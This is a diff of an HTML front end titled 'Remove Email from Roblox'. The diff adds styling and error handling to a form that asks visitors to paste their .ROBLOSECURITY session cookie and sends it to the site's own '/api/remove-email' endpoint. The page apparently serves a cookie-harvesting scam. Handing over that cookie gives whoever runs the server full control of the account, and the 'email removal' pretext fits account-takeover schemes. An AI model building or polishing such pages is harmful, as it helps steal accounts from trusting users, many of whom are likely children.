@@ -1,33 +1,77 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta charset="UTF-8">
   <title>Remove Email from Roblox</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      background: #f3f4f6;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      margin-top: 100px;
+    }
+    form {
+      background: white;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+      width: 100%;
+      max-width: 500px;
+    }
+    input, button {
+      width: 100%;
+      padding: 10px;
+      margin-top: 10px;
+      font-size: 16px;
+    }
+    button {
+      background: #22c55e;
+      color: white;
+      border: none;
+      cursor: pointer;
+    }
+    #response {
+      margin-top: 20px;
+      font-weight: bold;
+    }
+  </style>
 </head>
 <body>
-  <h2>Remove Email from Roblox</h2>
-  <form id="remove-form">
-    <label>.ROBLOSECURITY Cookie:</label><br/>
-    <input type="text" id="cookie" name="cookie" required style="width: 100%;"><br/><br/>
+  <form id="removalForm">
+    <h2>Remove Email from Roblox</h2>
+    <label>.ROBLOSECURITY Cookie:</label>
+    <input type="text" id="cookieInput" placeholder="Paste your cookie..." required>
     <button type="submit">Remove Email</button>
+    <div id="response"></div>
   </form>
-  <p id="response"></p>
 
   <script>
-    const form = document.getElementById('remove-form');
+    const form = document.getElementById('removalForm');
+    const responseDiv = document.getElementById('response');
+
     form.addEventListener('submit', async (e) => {
       e.preventDefault();
-      const cookie = document.getElementById('cookie').value;
+      responseDiv.innerText = "⏳ Processing...";
 
-      const res = await fetch('/api/remove-email', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ cookie })
-      });
+      const cookie = document.getElementById('cookieInput').value;
 
-      const data = await res.json();
-      document.getElementById('response').textContent = data.message || 'Done.';
+      try {
+        const res = await fetch('/api/remove-email', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ cookie })
+        });
+
+        const data = await res.json();
+        responseDiv.innerText = data.message || '❌ Something went wrong';
+        responseDiv.style.color = data.status === "success" ? "green" : "red";
+
+      } catch (err) {
+        responseDiv.innerText = "❌ Error sending request";
+        responseDiv.style.color = "red";
+      }
     });
   </script>
 </body>
